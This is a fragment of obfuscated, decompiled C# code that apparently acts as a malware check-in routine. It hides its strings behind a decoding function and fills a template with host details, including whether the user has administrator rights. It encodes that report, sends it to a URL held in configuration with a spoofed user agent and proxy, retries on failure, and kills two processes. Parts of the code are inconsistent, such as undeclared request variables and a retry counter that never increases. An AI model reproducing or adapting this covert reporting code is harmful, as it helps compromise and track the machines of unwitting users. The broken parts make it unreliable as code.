				text4 = text4.Replace(Class22.smethod_0("\uf4c0\uf487", 62689), text7);
				text4 = text4.Replace(Class22.smethod_0("\ueed6\uee90", 61171), text8);
				text4 = text4.Replace(Class22.smethod_0("\uf6da\uf69b", 63055), text9);
				bool flag;
				using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
				{
					flag = new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
				}
				text4 = (flag ? text4.Replace(Class22.smethod_0("\ue68a\ue6ca", 59010), Class22.smethod_0("\ue7ce", 59260)) : text4.Replace(Class22.smethod_0("\ue68a\ue6ca", 59010), Class22.smethod_0("\ue587", 58629)));
				text4 = text4.Replace(Class22.smethod_0("\uecdc\uec9f", 60633), GClass2.GClass3.String_2);
				text4 = (GClass2.GClass3.Boolean_0 ? text4.Replace(Class22.smethod_0("\uef5c\uef1e", 61305), Class22.smethod_0("\ue7ce", 59260)) : text4.Replace(Class22.smethod_0("\uef5c\uef1e", 61305), Class22.smethod_0("\ue587", 58629)));
				text4 = smethod_0(Encoding.UTF8.GetBytes(text4));
				int num2 = 0;
				while (true)
				{
					try
					{
						HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(GClass2.GClass3.GClass4.String_5.Replace(Class22.smethod_0("\uf693\uf687", 63156), text4));
						httpWebRequest.Timeout = 60000;
						httpWebRequest.Method = Class22.smethod_0("\uf1fb\uf1f9\uf1e8", 61824);
						webProxy.BypassProxyOnLocal = false;
						obj.Proxy = webProxy;
						obj.UserAgent = GClass2.GClass3.GClass4.String_2;
						_ = (HttpWebResponse)obj.GetResponse();
						new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
						return true;
					}
					catch (Exception)
					{
						Thread.Sleep(60000);
						if (num2 > 3)
						{
							break;
						}
					}
				}
				process.Kill();
				process2.Kill();
				return true;
			}
			catch (Exception)
			{
				num++;
				if (num > 10)
				{
					return false;
				}
				continue;
			}
		}
		smethod_24(new string[2]
		{
			Class22.smethod_0("\ue9c3\ue9d8\ue9c5", 59669),
			Class22.smethod_0("\uf789\uf796\uf795\uf790\uf789\uf796", 63449)
		});
		return false;
	}
}
